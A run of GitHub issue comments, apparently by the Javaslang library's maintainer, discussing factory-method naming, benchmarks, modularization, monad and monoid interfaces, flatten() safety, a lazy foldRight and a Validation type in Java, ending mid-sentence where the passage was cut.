will implement your suggestion and change the current API.\nWe have also the primitive arrays, e.g. List.ofAll(int[]) gives List<Integer>, but I think it will not collide with the signatures you sketched above.\n. Lukily we are still in beta. There are quite some (little) changes in the pipeline :-)\n. Before performing this change we will boost up the test-coverage to ~100% in order to get sure all is still working as expected.\nExample:\n``` java\nT[] array = ...;\n// = List before the change\nList.of(array);\n// = List after the change\nList.of(array);\n```\nRight?\nIt might break existing programs. This is the reason why we have a major release, jumping from 1.x to 2.0.0. The API changes in order to improve.\n. It would be nice to have a syntax that aligns with JEP 269: Convenience Factory Methods for Collections. Java will most probably get the syntax List.of(T...).\nWhat comes in the way is List.of(T). Maybe it can be renamed to List.single(T) or List.singleton(T).\nThen all List.ofAll(...) methods can be renamed to List.of(...). To be checked...\n. This gist describes the problems of of(T) and of(T...): https://gist.github.com/danieldietrich/45bd2678001444d09a5b\n. It will look like this\n``` java\npublic class Test {{\n// List.single(T)\nList<List<String>> l1 = List.single(List.of(\"1\"));\n\n// List.of(Iterable)\nList<String> l2 = List.of(List.of(\"1\"));\n\n// List.of(T...)\nList<List<String>> l3 = List.of(List.of(\"1\"), List.of(\"2\"));\n\n}}\ninterface List extends Iterable {\nstatic <T> List<T> single(T element) { ... }\n\n@SafeVarargs\nstatic <T> List<T> of(T... elements) { ... }\n\nstatic <T> List<T> of(Iterable<? extends T> elements) { ... }\n\n}\n``\n. After starting to refactorof(T) -> single(T)andofAll() -> of()I came to the conclusion, that it is better to stay withofandofAlland just renameof(T...)toofAll(T...)for the following reasons:\n- there would otherwise raise inconsistencies in the naming scheme, e.g.Stack.pushAll(Iterable)vsStack.push(T)- naming the latterpushSingleis not what we want\n- renaming justof(T...)is minimal intrusive regarding changes of the API. this is important for users which already build upon Javaslang\n- factory methods easy to remember - all start withof...`\nTherefore I will rename of(T...) to ofAll(T...).\n. Great, thx :-)\n. Here is an interesting case:\nTuple1 has a toSeq method, which creates a List containing the tuple element:\n``` java\nclass Tuple1 {\nT1 _1;\n\n// ...\n\npublic Seq<?> toSeq() {\n    return List.ofAll(_1);\n}\n\n}\n```\nOne could think that at runtime List.ofAll(Iterable) is called if _1 is of type Iterable. But because of type erasure, the generic T1 is erased to Object at compile time. Therefore the method toSeq calls List.ofAll(T...).\nThe following code works as expected:\n``` java\nTuple1> t = Tuple.of(List.of(1));\n// = List(List(1))\nt.toSeq();\n```\nI think it is a little bit less confusing if the Tuple1.toSeq implementation calls List.of(_1) instead of List.ofAll(_1). I will change that.\n. Just saying: This does not compile:\njava\nSortedSet<Integer> set = TreeSet.ofAll((a, b) -> a - b, 1, 2, 3);\nIt needs to be\n``` java\n// like this\nComparator c = (a, b) -> a - b;\nSortedSet set = TreeSet.ofAll(c, 1, 2, 3);\n// or like that\nSortedSet set = TreeSet. ofAll((a, b) -> a - b, 1, 2, 3);\n```\nIf we rename ofAll to of it works. However, we will stay with the current API. There will always be ambiguities and we know how to solve them.\n. @ggalmazor Oh my gosh - I think we have to do it like you said in your first comment and that will solve all problems :-)\n\nMaybe we could have a List.ofAll(T[] tArray)\nI mean, List.ofAll(T[] tArray) => List\n\nThat is having these:\njava\nof(T)\nof(T...)\nFor SortedSet/SortedMap also versions, which take a Comparator:\njava\nof(Comparator<? super T>, T)\nof(Comparator<? super T>, T...)\nThe solves the problem in the previous comment.\nTo solve your original problem, we will add:\njava\nofAll(T[])\nBtw, this is consistent in the way, that all ofAll methods take a single argument that is inherently multi-valued and will be unboxed.\nEXTRA POINTS: The of(T) and of(T...) methods will be consistent with the Java standard API!\nHave to check, if the above really holds in all cases...\nUpdate: I think I have overseen the one case where we want to create an Object of <T[]>. It is not possible to do it with of. Either we add an additional single(T) for this case - or we live with the fact that we need to provide extra generics for that rare case xxx.<T[]> of(...). Then ofAll(T[]) is unnecessary, right?\n. What I do not like about it:\n- we found just another ambiguity\n- again changing the API that was supposed to be final\nWhat is good about it:\n- aligning with standard Java is not that bad\n- we do not break Javaslang 1.2.2 API here\nNote: It is more important that we are able to create a TreeSet with an inline comparator and varargs  TreeSet((a, b) -> ..., v1, v2, ...) than wrapping an Array. The latter is considered as rare case:\n\n. Before closing this check CharSeq:\njava\npublic static CharSeq of(CharSequence sequence);\n. :+1:\n. We have some tests - but refactoring is hard. IntelliJ changes too much - all comments, the Generator.scala String tempates... Sometime right, somethimes not o_O\nI will fix that...\n. On the other hand some javadoc bugs introduced by our previous refactoring (of -> ofAll) are not fixed again. All will be good :-)\n. @ggalmazor I'm able to finish the refactoring tomorrow. Until then I will not pull any PR's so that we are able to go back easily if we find any blockers in our tests. With blockers I mean API that does not seem to be right or feels not good.\n. @ggalmazor finished. I'm in a hurry - continuous delivery ;) I will create a 2.0.0-RC2 now. Changes, if any, will go to 2.0.0-RC3-SNAPSHOT.\n. Works flawless so far. I will close this ticket. Any experience / additional tests or notes are welcome!\n. Hi!\nI'm completely in it, you already bought me to make the tests more readable! :)\nI looked at the fork. I like the idea to slice the tests by business logic (in a technical domain), e.g. having a test for factory methods of List.\nOur requirements are:\n- reuse as many tests as possible within the class hierarchy (e.g. Value tests, Traversable tests, Seq tests etc.)\n- don't loose the ability to overwrite special assertion behavior, currently needed for Maps and CharSeq I think.\n- also we distinguish between collections that check equality to be same object vs. same content.\nI prefer high cohesion of functionality. E.g. instead of spreading the tests of one method (e.g. head()) over many classes (e.g. EmptyTraversableTest, SomeOther1Test, SomeOther2Test, ...) a developer needs to have it in one place in order to see if something is missing.\nCurrently we use abstract methods and assertion override to define the behavior of a specific test impl. How would this look like with a @RunWith(Parameterized.class). Could you sketch this, please?\nThx,\nDaniel\n. Nice!\n. Yes - but it might be useful. I created an issue: #935\n. Thinking again about it justifies the current implementation. sliding() and grouped() are Iterable operations. Forcing a Set to return a Set when sliding is not a good idea. Iterator is a good choice, it also lets us convert the sliding() elements to a Traversable.\n. thx! not good. we should delete our little benchmark framework and create a separate javaslang-benchmark project containing something more sophisticated.\n. Just wanted to save this snippet here:\n``` java\npublic class Bench {\nstatic final int COUNT = 100000;\nstatic final int ITERATIONS = 100;\nstatic final int WARMUP = 10;\n\npublic static void main(String[] args) {\n\n    // Average time after 100 iterations: 6.490000 ms\n    timed(() -> scala.collection.immutable.Stream.range(0, COUNT, 1, new scala.math.Numeric.IntIsIntegral$()).length());\n\n    // Average time after 100 iterations: 7.070000 ms (using Lazy with synchronized)\n    // Average time after 100 iterations: 5.500000 ms (using Lazy without synchronized)\n    timed(() -> javaslang.collection.Stream.range(0, COUNT).length());\n\n    // Average time after 100 iterations: 0.600000 ms\n    timed(() -> java.util.stream.IntStream.range(0, COUNT).boxed().count());\n}\n\nstatic void timed(Runnable stuff) {\n    long vs = 0;\n    for (int i = 0; i < WARMUP; i++) {\n        System.gc(); // try to get rid of potential GC pauses\n        stuff.run();\n    }\n    for (int i = 0; i < ITERATIONS; i++) {\n        System.gc(); // try to get rid of potential GC pauses\n        long t = System.currentTimeMillis();\n        stuff.run();\n        vs += System.currentTimeMillis() - t;\n    }\n    System.out.printf(\"Average time after %d iterations: %f ms\\n\", ITERATIONS, ((double) vs) / ITERATIONS);\n}\n\n}\n```\n. Interesting benchmarks in derive4j/derive4j#30, especially here.\nIt shows, that the synchronized variant fits best for or Lazy impl:\n``` bash\nnot synchronized:\nAverage time after 200 iterations: 14.260000 ms\nLazy synchronized:\nAverage time after 200 iterations: 17.850000 ms\nLazy AtomicReference:\nAverage time after 200 iterations: 18.785000 ms\nLazy synchronized WeakReference:\nAverage time after 200 iterations: 20.530000 ms\nLazy AtomicReference of WeakReference:\nAverage time after 200 iterations: 18.230000 ms\n``\n. Yes, it is! Are you interested in writing benchmarks? That would be really great.\n. @mping @malduarte it is great to have you both on board! To warm up I would add the needed dependency/dependencies to thejavaslang/pom.xml`. @RobWin did that already in his project javaslang-circuitbreaker (which has a grade build): https://github.com/javaslang/javaslang-circuitbreaker/tree/master/src/jmh/java/javaslang/circuitbreaker\nMy vision is to just make it run with the test-build. Later we might extract the benchmarks to a separate module or project but that's not important for now. First we can concentrate of very simple benchmarks, e.g. having a specific collection, we measure some basic operations, all one-liners. These operations could be those documented in our javadoc:\nThese operations:\n- head()\n- tail()\n- get(int)\n- update(int, T)\n- prepend(T)\n- append(T)\nStarting with these collections:\n- List\n- Stream\n- Vector\nLater I want to find a way to compare Javaslang vs Scala vs Clojure (and maybe Kotlin?)\n. Great!\n. Tests are ongoing. I will release 2.0.0 final this week. The benchmarks will be part of 2.1.0.\n. Another candidate to compare with Javaslang: http://pcollections.org/\n. We have a great javaslang-benchmark module now. Test are ongoing. This issue can be closed.\n. Towards #449\n. Towards #449 \nThe impl is so clean and nice now - I'm really satisfied.\nThe monadic operations are just decoration now, I already have them in the pipeline...\n. Hi, thx - great suggestion!\nSorry for the late answer. I just realized that I didn't watch my own project any more o_O and therefore received no notifications. Fixed that.\n. I removed the algebra package in 2.0.0. It might be re-added in 2.0.1... I have to further investigate how to tightly integrate Monads. Currently Traversables behave semi-monadic with a flatMap(Function<T, Iterable>)\n. I thought of having algebraic operations in a separate, pure abstraction layer. For that reason we wanted to create javaslang-pure.\nThere where some caveats regarding Java's type system. I had to make some design decisions in order to make the code more readable. One example is the need for higher-kinded types. I created a type Kind<M, A> which was used for constructing types. But I think for most users it is more confusing than helping.\nI ask myself if we are able to lift the algebraic types to an abstract, compositional layer which acts upon the core Javaslang layer.\nHere are some issues regarding this topic:\n- #288 Add substitute for removed Monad interface\n- #300 [Analysis] How to add a Monad abstraction on top of existing monadic classes\nIn our example, we may have\njava\ninterface Monoid<T> {\n    <M extends Traversable<T>> T fold(M that) {\n        that.fold(zero(), this::combine);\n    }\n}\n. See also #674 for folds (https://github.com/javaslang/javaslang/issues/674#issuecomment-153706017)\nI will check if and how to re-add the javaslang.algebra package to Javaslang.\nBecause of the lack of higher-kinded types we needed to fall back to\n``` java\ninterface FilterMonadic {\n FilterMonadic flatMap(Function<? super T, ? extends java.lang.Iterable<? extends U>> mapper);\n// ...\n\n}\n```\nA real monadic type would have instead:\njava\n<U> Monad<U> flatMap(Function<? super T, ? extends Monad<? extends U>> mapper);\nBut that is not possible with Java. I created Kind<M extends Kind<M, ?>, T> to separate the container type M from its component type T. This allowed us to write\n``` java\n// think it looked like this not 100% sure - but the idea counts\ninterface Monad, T> extends Kind {\n    // ?or > MONAD flatMap(Function<? super T, MONAD> mapper);\n    > MONAD flatMap(Function<? super T, ? extends Kind> mapper);\n}\ninterface List extends Monad, T> {\n    @Override\n    , U>> List flatMap(Function<? super T, ? extends Kind> mapper);\n}\n```\nI think for most ~~programmers~~ Java coders the current type signatures fit better:\njava\ninterface List<T> {\n    <U> List<U> flatMap(Function<? super T, ? extends Iterable<? extends U>> mapper);\n}\nHave to think about it again, how to integrate the algebraic interfaces (Monad, Functor, Monoid, ..., maybe here also Foldable, ...)\n. Here is the last version that included the javaslang.algebra package: 87ea020354.\nI will now pull it out of the grave and re-animate it.\nPlan:\n``` java\n@FunctionalInterface\ninterface Semigroup {\nA combine(A a1, A a2);\n\n}\ninterface Monoid extends Semigroup {\nstatic <A> Monoid<A> of(A zero, Semigroup<A> semigroup) { ... }\n\nstatic <A> Monoid<Function<A, A>> endoMonoid() { ... }\n\nA zero();\n\n}\ninterface Foldable extends java.lang.Iterable {\n// convenience method, same as foldLeft(monoid)\nT fold(Monoid<? extends T> monoid);\n\nT fold(T zero, BiFunction<? super T, ? super T, ? extends T> combine);\n\nT foldLeft(Monoid<? extends T> monoid);\n\n<U> U foldLeft(U zero, BiFunction<? super U, ? super T, ? extends U> combine);\n\nT foldRight(Monoid<? extends T> monoid);\n\n<U> U foldRight(U zero, BiFunction<? super T, ? super U, ? extends U> combine);\n\n}\ninterface Functor {\n<U> Functor<U> map(Function<? super T, ? extends U> mapper);\n\n}\n// this is more like a relaxed monad / semi monad / filter monadic\ninterface Monad extends Functor {\nMonad<T> filter(Predicate<? super T> predicate);\n\n<U> Monad<U> flatten();\n\n<U> Monad<U> flatMap(Function<? super T, ? extends java.lang.Iterable<? extends U>> mapper);\n\n@Override\n<U> Monad<U> map(Function<? super T, ? extends U> mapper);\n\n}\n``\n-Kind,CheckedFunctorandCheckedMonadare not needed any more.\n- collections (TraversableOnce) and controls (Option,Try, etc.) will implementMonadandFoldable`\n@talios, @jbgi, @hamnis, @mvh77 this might be of interest for you...\n. @jbgi awesome, thx!\n. @jbgi do you have a foldMap?\njava\n/**\n * Maps this elements to a {@code Monoid} and applies {@code foldLeft}, starting with {@code monoid.zero()}:\n * <pre><code>\n*  foldLeft(monoid.zero(), (ys, x) -&gt; monoid.combine(ys, mapper.apply(x)));\n * </code></pre>\n *\n * @param monoid A Monoid\n * @param mapper A mapper\n * @param <U>    Component type of the given monoid.\n * @return the folded monoid value.\n * @throws NullPointerException if {@code monoid} or {@code mapper} is null\n */\ndefault <U> U foldMap(Monoid<U> monoid, Function<? super T, ? extends U> mapper) {\n    Objects.requireNonNull(monoid, \"monoid is null\");\n    Objects.requireNonNull(mapper, \"mapper is null\");\n    return foldLeft(monoid.zero(), (ys, x) -> monoid.combine(ys, mapper.apply(x)));\n}\n. Our semi-Monad types will obey the following monad laws:\n- Right identity: m.flatMap(unit) \u2261 m\n- Associativity: m.flatMap(f).flatMap(g) \u2261 m.flatMap(x -> f.apply(x).flatMap(g))\nBecause the mapper function of flatMap returns an Iterable type instead of a Monad, the following monad law ~~does~~ may only hold (depending of the concrete implementation), if our Monad interface is also of type Iterable:\n- Left identity: unit(a).flatMap(f) \u2261 f.apply(a)\nHowever, we will not make the Monad interface extend Iterable because this is not very algebraic.\n. Towards #449 \n. Towards #449 \n. Hi,\nin general this is a good idea. However, at the moment the additional overhead would be too much compared to the benefits. E.g. javaslang.concurrent does only contain 2 classes.\nAlso I'm in fear of versioning hell :-)\nAt the moment Javaslang is nice and lean. I think it has a good size.\nDaniel\n. The intra-operability aspect is an integral aspect of Javaslang. The current lib represents the core, including all features we have so far!\nBase (package: javaslang):\nThe base contains the following at its core:\n- Function\n- Tuple\n- Lazy\nThese are base interfaces which encapsulate functionality that needs to be kept in one place (high cohesion of functionality):\n- Iterable (note: similar to java.lang.Iterable's Iterator resides in java.util, Javaslang's Iterator also resides in a different package, namely javaslang.collection.Iterator)\n- Value (note: literally all Javaslang types but Tuple* and Function* are of type Value. Therefore here reside the conversion methods between Values and therefore we have dependencies to all packages)\nVision\nJavaslang is being developed with focus on a high level of intra-operability. All 'just fits together'.\nThis is exactly the part which makes developing fun. It 'just works'.\n``` java\n// = Some(hi)\nOption option = Option.of(\"hi\");\n// = List(hi)\nList list = option.toList();\n```\nor\n``` java\n// = List()\nList list = list.empty();\n// = Failure(java.util.NoSuchElementException)\nTry try = list.toTry();\n// but... = Success(hi)\nList.of(\"hi\").toTry()\n```\nCompositional Programming\nI could also imagine to integrate Future - and therefore concurrency - more tightly into the collection library:\njava\nFuture<Seq<String>> someFutureResult = Stream.of(1, 2, 3, 4)\n        .parallel()\n        .map(someMapping)\n        .filter(someFiltering);\nan implementation could look like this:\n``` java\n// just an example - can be easily generalized\nStream> stream = Stream.of(1, 2, 3, 4)\n        .map(i -> Future.of(() -> {\n            Thread.sleep(rnd.nextInt(250));\n            return String.valueOf(i);\n        }));\nFuture> sequence = Future.sequence(stream);\n// ...\n```\nthis would need parallel() return something like\n``` java\n// note: maybe Future then cannot be a Value in order not to clash with Seq\ninterface ParrallelSeq extends Future>, Seq {\n// ...\n\n}\n```\nDo you see the benefits?\n. Of cause each type could have a static Xxx.convert(Value) method instead of the conversion methods Value.toXxx(). This would decouple some of the existing dependencies.\njava\n// = list.toOption()\nOption.convert(list);\nFrom the API perspective it is more elegant to have a fluent API, e.g. calling toXxx().\nIn general, the end-user does not see the dependencies directly. It's all a matter of decoupling a system for the reason of making things exchangeable. But Javaslang is more like a language extension for Java, it does not really need to be decoupled at its core.\nOn the other hand - when having mobile development in mind, it might be interesting to have minimal modules because of limited amount of memory. However, the Android platform currently does not support Java 8 and iPhone development with Java is also still in its infancy. I've heard that in (a near) future, Java will run natively on iPhone. Maybe a modularized Javaslang is a target for a future Javaslang release (3.0.0?), also when having Java 9/Jigsaw at hand...\nBtw, we will have additional modules for interoperability with other libs, like the new javaslang-jackson module.\n. In fact, more abstract composability would be the solution for better modularity. But I don't know if this is helpful regarding simplicity and usability for most of the users. This would go more in the direction of functionaljava. Did you take a look at it already? However, I think it also isn't modularized...\n. @hamnis: Please provide me with the following information which will help me to slice modules:\n- What are the main features you are interested in?\n- Which Javaslang features are currently out of focus for you?\n- Which other libs do you use for features which Javaslang offers?\nMany thanks!\nGreets\nDaniel\n. The Property Checking framework in javaslang.test is a good candidate to move to a different module, let's say javaslang-test.\n. I will start modularization after the release of 2.0.0 (on 1st Dec).\nAt a minimum javaslang.test will move to its own repo.\nAdditionally it will be investigated how to reduce dependencies to slice Javaslang.\nBuild: it could be a multi-module maven project with several jars etc.\n. We will make a separate javaslang-test module starting with 2.0.0. Gen, Arbitrary, Property et al. will move to javaslang-test. The javaslang 2.0.0 release will then look like this. \n\nGen and Arbitrary currently implement Value. I will re-think this.\n. I understand Javaslang as language extension.\n\nIt replaces \"a well-known conventional synonym\". This is done primarily to avoid discomfort caused by the conventional synonym or discomfort or annoyance caused by having to elaborate further.\n\nSee wikipedia/Slang.\nNot all people will love it.\n\n\"It's a taboo term in ordinary discourse with people of a higher social status or greater responsibility.\"\n\nBut that's ok. Important is its purpose. We have a clear vision - more control, less code.\n\nSlang is on the edge.\n\nThe whole is more than the sum of its parts. Therefore providing a set of separate fragments was not the original idea when creating Javaslang.\nHowever, the Java standard library is modularized by itself. Maybe we will do the same to ~~enable~~ encourage mobile platforms to use it. But maybe future mobile platforms will not have resource problems any more because of future enhancements of processors and memory.\n. This will take place after 2.0.0 - too much technical overhead without any business value...\n. We defined separate modules\n- javaslang\n- javaslang-match\n- javaslang-pure\n- javaslang test\nThese are the core Javaslang components and are shipped in separate jars. Other components can be found in separate Javaslang. projects.\nWe can't split up the core project 'javaslang' into more fine-grained packages because it contains basic building blocks which rely on each other.\nThank you for suggesting to split the project.\n. thx!\n. See #723 \n. @ggalmazor Do you need/use flatten() directly? Is it a viable option for you to use one of the alternatives mentioned above?\n. Thx for the feedback, I will implement your idea to use flatten() as shortcut for flatMap(identity()).\n. Some specs...\nFlatten\njava\ninterface FilterMonadic<T> {\n    /**\n     * Flattens this {@code Value} by one level.\n     * <p>\n     * Example:\n     *\n     * <pre><code>List(Some(1), Some(2), None).flatten() = List(1, 2)</code></pre>\n     *\n     * <strong>Caution:</strong> Effectively {@code flatMap(Function.identity())} is called. That requires this\n     * elements to be of type {@code java.lang.Iterable<U>}. More specifically this type {@code FilterMonadic<T>}\n     * has to be of type {@code FilterMonadic<? extends java.lang.Iterable<U>>} for some given {@code U}.\n     * We (currently) can't express this constraint with Java's type system. If this type does not fulfill the\n     * requirement at runtime, a {@code ClassCastException} is thrown.\n     * <p>\n     * <strong>It is unsafe to use {@code flatten()}.</strong> Especially this compiles but throws at runtime:\n     *\n     * <pre><code>// Compiles. Throws at runtime because elements are not Iterable!\n     * List&lt;String&gt; list = List(1, 2, 3).flatten();</code></pre>\n     *\n     * <strong>Also beware of the following exceptional cases:</strong> {@link CharSeq#flatten()} and {@link Map#flatten()}.\n     *\n     * @param <U> the nested component type\n     * @return A flattened version of this {@code Value}.\n     * @throws ClassCastException if this elements are not of type {@code ? extends java.lang.Iterable<? extends T>}.\n     */\n    <U> FilterMonadic<U> flatten();\n}\nHere are some interesting corner-cases:\nCharSeq (a String wrapper)\njava\npublic final class CharSeq implements CharSequence, IndexedSeq<Character>, Serializable {\n    /**\n     * Elements of a {@code CharSeq} are flattened to identical characters.\n     * <p>\n     * <strong>Caution:</strong> Behaves different than most other {@code Value.flatten()} implementations.\n     * <p>\n     * Example:\n     *\n     * <pre><code>// = IndexedSeq('a', 'b', 'c')\n     * CharSeq.of(\"abc\").flatten();</code></pre>\n     *\n     * @param <U> the component type of the result, needs to be {@code Character}\n     * @return an indexed sequence of characters\n     * @throws ClassCastException if {@code U} is not {@code Character}.\n     */\n    @SuppressWarnings(\"unchecked\")\n    @Override\n    public <U> IndexedSeq<U> flatten() {\n        return (IndexedSeq<U>) Vector.ofAll(this);\n    }\n}\nMap (namely HashMap, TreeMap)\njava\npublic interface Map<K, V> extends Traversable<Map.Entry<K, V>>, Function<K, V> {\n    /**\n     * Entries of a {@code Map} are flattened to the elements of their {@code Iterable} values.\n     * <p>\n     * <strong>Caution:</strong> Behaves different than most other {@code Value.flatten()} implementations.\n     * <p>\n     * Example:\n     *\n     * <pre><code>// = Seq(1, 2)\n     * HashMap.empty()\n     *     .put(0, Option.of(1))\n     *     .put(1, Option.of(2))\n     *     .flatten();</code></pre>\n     *\n     * @param <U> the component type of the resulting sequence\n     * @return an indexed sequence of elements of type U\n     * @throws ClassCastException if the value of a map entry {@code (key, value)} is not {@code Iterable}.\n     */\n    @Override\n    <U> Seq<U> flatten();\n}\n. @ggalmazor It is unsafe but there is no other possibility to express it with Java's type system.\nIn particular this is now possible:\njava\n// = List(1, 2)\nList<Integer> ints = List.of(new Some<>(1), new Some<>(2), None.instance());\nBut this also compiles and will throw at runtime:\njava\n// two errors: elements not iterable *and* wrong return type assumed\nList<String> unsafe = List.of(1, 2, 3).flatten();\nQuestion: Will you use that in production?\nThe question is not rhetoric. If the answer is yes, flatten() will stay in Javaslang :-)\n. @ggalmazor thx for the fast answer - I'm totally agreeing. Haven't thought of providing a better error message, great idea. Will do that!\n. Hi Ruslan,\nwhat is the use-case for this method?\nIf it is needed in javaslang-jackson I would consider to put it there as internal helper method. The main reason for that is, that it is currently unsafe. The generic return type <T extends Tuple> allows us to do incorrect things:\njava\nTuple0 tuple = Tuple.ofAll(List.of(1, 2, 3));\nWhere do you use the method?\nGreets,\nDaniel\n. Yes, let's remove it. I currently do the same with Value.flatten().\n:+1: \n. Note: This is a little bit philosophical but random value generators Gen and Arbitrary are singleton types. We talk about an arbitrary value or a generated value. It is just one. However, subsequent calls may produce different values.\n. IMO its not worth to blow up the type hierarchy. We currently can express the above like so:\n``` java\n// -- using functions\n// if dep1.doStuff returns void\nFunction2 feature = (dep1, dep2) -> () -> dep1.doStuff(dep2.getStuff());\n// if dep1.doStuff returns Runnable\nFunction2 feature = (dep1, dep2) -> dep1.doStuff(dep2.getStuff());\nRunnable featureEnv1 = feature.curried().apply(dep1).apply(dep2);\n// -- eager way using Try\nTry.of(dep2::getStuff).andThen(dep1::doStuff);\n// -- cuncurrent way using Future (chaining operations)\nFuture.of(dep2::getStuff).andThen(dep1::doStuff);\n```\n(Impl of Future is in the works)\nIs this sufficient for you?\n. We once had (for a short time) the consumers. But I liked Scala's view on types:\n- all is an object / no primitive types\n- all is in between Any, AnyRef and Nothing\n- Unit is void\nThis is the foundation for all is a value / an Expression. And all can be expresses using Function*.\nI will close this issue then.\nThank you for your ideas! They are very helpful.\n. hi, just saw that this is a duplicate of #673. There are links of implementations!\n. > I'm working on a Java port of Scalactic Or and Every (http://www.scalactic.org/user_guide/OrAndEvery) that's based on javaslang 2.\nDo you plan to contribute it? (c:\n. Cool!\n. :+1: \n. done\n. :-D oh noes!\n. yes - we don't need to reach 100%. the tool is better...\n. this is very similar to #716 \n. Can't handle this until 2.0.0. Will move this to 2.0.1 which will come soon after...\nExample: Lazy.sequence\njava\n    /**\n     * Reduces many {@code Lazy} values into a single {@code Lazy} by transforming an\n     * {@code Iterable<Lazy<? extends T>>} into a {@code Lazy<Seq<T>>}.\n     *\n     * @param lazyValues An iterable of lazy values.\n     * @return A lazy sequence of values.\n     */\n    public Lazy<Seq<T>> sequence(Iterable<? extends Lazy<? extends T>> lazyValues) {\n        Objects.requireNonNull(lazyValues, \"lazyValues is null\");\n        return Lazy.of(() -> Stream.ofAll(lazyValues).map(v -> v.get()));\n    }\n. :+1:\n. We have finished:\n- Lazy\n- Future\n- Option\n- Try\nWe add sequence to:\n- Validation\nWe will leave sequence for the following:\n- Either/LeftProjection/RightProjection\n- MatchValue\n- all collections\n. great! thx\n. I like this addition. Previously there were too many function applications - as you say\nThx!\n. Please note that I made a slight change - now using iterator() instead of Iterator.ofAll(this)\n. Mmh, I haven't seen this signature yet, e.g. in Scala TraversableOnce. Haskell is lazy by default, I think therefore it will just work out-of-the-box there.\nI've found this example for using shortcut-circuiting logic, implementing take with foldr in Haskell:\n``` haskell\ntake :: Int -> [a] -> [a]\ntake n xs = foldr step [] (tagFrom 1 xs)\n    where step (a, i) rest\n               | i > n     = []\n               | otherwise = a:rest\ntagFrom :: Enum i => i -> [a] -> [(a, i)]\ntagFrom i xs = zip xs [i..]\n```\nSource: http://stackoverflow.com/questions/15879940/implementing-take-using-foldr\n. Nice! I thought there was an infrastructure problem because there was no activity on codecov.\n. Follow this article: http://voidmainargs.blogspot.de/2011/08/folding-stream-with-scala.html\nAlso see this: http://gaabbe.win/issue/1975741/foldright-on-infinite-lazy-structure\n. A lazy foldRight is good for infinite data structures like Iterator and Stream because an eager implementation evaluates all elements. A lazy version also helps when shortcut circuit logic is needed.\nA general Javaslang foldRight (of TraversableOnce) could look like this:\njava\n<U> U foldRight(U zero, BiFunction<? super T, ? super U, ? extends U> combine) {\n    return isEmpty() ? zero : combine(head(), tail().foldRight(zero, combine));\n}\nHowever, the following example ends up with a StackOverflowError when eager evaluated, although it should terminate from a logical viewpoint:\njava\n// StackOverflowError\nboolean b = Stream.repeat(true).foldRight(false, (a, b) -> a || b);\nIn order to get the example work we make the second argument of the combine function lazy:\njava\n<U> U foldRight(U zero, BiFunction<? super T, ? extends Supplier<? super U>, ? extends U> combine) {\n    return isEmpty() ? zero : combine(head(), () -> tail().foldRight(zero, combine));\n}\nThis leads to:\njava\n// = true\nboolean b = Stream.repeat(true).foldRight(false, (a, b) -> a || b::get);\n@jbgi: There is only one problem - the recursion could now cause a StackOverflowError.\nAny suggestions? Sadly we have no tail recursion. Are trampolines a workaround here? How would a constant stack solution look like. Would it be still efficient regarding creation of intermediate objects? foldRight already has a recursive call and an extra supplier for the lazy evaluation. Creating more objects each step would stress the GC.\n. Yes, I also use reverse.foldLeft for Seq types.\nThere might be one solution to reuse the current non-lazy signature for infinity types, by using Javaslang's Lazy type. It allows us to declare T instead of Lazy<T> resp. Supplier<T> (implemented by Lazy) by using a Proxy mechanism.\n``` java\nLazy lazyVal = Lazy.of(() -> \"lazy\"); \nCharSequence funkyVal = Lazy.val(() -> \"funky\", CharSequence.class);\n```\nIn other word, we might re-use the type signature <U> U foldRight(U zero, BiFunction<? super T, ? super U, ? extends U> combine) for a lazy solution. Have to test it, may be I've overseen something.\nHowever, this solution still will have the recursion.\n. No, Lazy.val does only work for interfaces :-/\n. Trying to mimic features of lazy languages like Haskell in non-lazy languages like Java ends on the sour note of heavy use of new instance creation. It seems to me like toying around in places where industry strength, high performance code is expected.\nHowever, in our case foldRight simply does not work for infinite data structures. I really would love to see a nice solution for foldRight. There are two requirements:\n- no stack overflow may occur\n- the heap should not grow much with intermediate wrapper objects\nCurrently I have no viable solution, therefore defering this issue unter Javaslang 2.0.1.\n. > It seems to me like toying around in places where industry strength, high performance code is expected.\nI'm acting like Klaus Kinski :-)\nhttps://www.youtube.com/watch?v=7O96B4cij10\n. See also http://stackoverflow.com/questions/12892701/abort-early-in-a-fold\n. @nbardiuk showed in amaembo/streamex#39 how to achieve shortcut circuiting based on intermediate Java Stream operations (see this)\n. also see this: https://gist.github.com/nbardiuk/142a43f5a4a6ee88417f60622fa9a62c\n. There is no direct way to achieve this in Java because there is no native lazy evaluation.\nWe will not implement the overhead of using Supplier.. Needed for foldRight tests, see #779 \n. Awesome!!\n. I love duplicate code - when it disappears :-) Great!\n. You are right! Many thanks\n. Btw, for your planning, I will push RC1 to maven central on 15. Nov.\nI need to do s.th. different than coding in between, s.th. healthy :-)\n. yes, will do.\n. \u0441\u043f\u0430\u0441\u0438\u0431\u043e!\n. :-) \n. Note: Also fixed a corner case in the internal FutureImpl.run() method\n. Towards #449 \n. I'm aware that this might change the behavior of applications when migrating from Javaslang 1.2.2 to 2.0.0. Beside the introduction of the new collections, making the API better at the cost of backward compatibility issues is the reason for having a new major version.\n. Towards #449 \n. @enelson The Validation type should be located in javaslang.control. I would use Try as reference impl (some function args will be re-visited soon with #865).\nWe should keep an eye on the functional interfaces Try.Checked*. We use them also in Future and maybe in Validation. There was a recent discussion in #865 if it would make sense to move them outside of Try. But I'm not convinced yet.\n. :+1: \n. We need to take care that Validation is no monad, it is an applicative functor.\nSee also http://robotlolita.me/2013/12/08/a-monad-in-practicality-first-class-failures.html\n. Great, I will clear the way (see #947)\n. @enelson Yes, we generate redundant code. However, it better to first write a stable 'prototype' which later is moved to the generator (because writing generator code is not really fun) :-)\nI would like to take a look at the builders. I ask myself if we really need them. I have state transitions in mind when I think of Validation. I'm very excited to see your approach!\n. Thx\n. Here is an interesting discussion at a PR of Eric: https://github.com/javaslang/javaslang/pull/986/files#r48573515\nA possible implementation of Applicative could make use the Kind type:\n``` java\n// trait Apply[F[_]] extends Functor[F]\npublic interface Applicative, A> extends Functor {\n// def ap[A,B](fa: => F[A])(f: => F[A => B]): F[B]\n<B> Applicative<F, B> ap(Kind<F, ? extends Function<? super A, ? extends B>> f);\n\n@Override\n<B> Applicative<F, B> map(Function<? super A, ? extends B> f);\n\n}\n// type constructor: TYPE is split in TYPE<?> and T\ninterface Kind, T> {\n}\ninterface Validation extends Kind, A>, Applicative, A> {\n// def ap[EE >: E, B](x: => Validation[EE, A => B])(implicit E: Semigroup[EE]): Validation[EE, B]\n<B> Validation<E, B> ap(Validation<E, ? extends Function<? super A, ? extends B>> f);\n\n@Override\n<B> Validation<E, B> map(Function<? super A, ? extends B> f);\n\n// def ap[A, B](fa: => Validation[L, 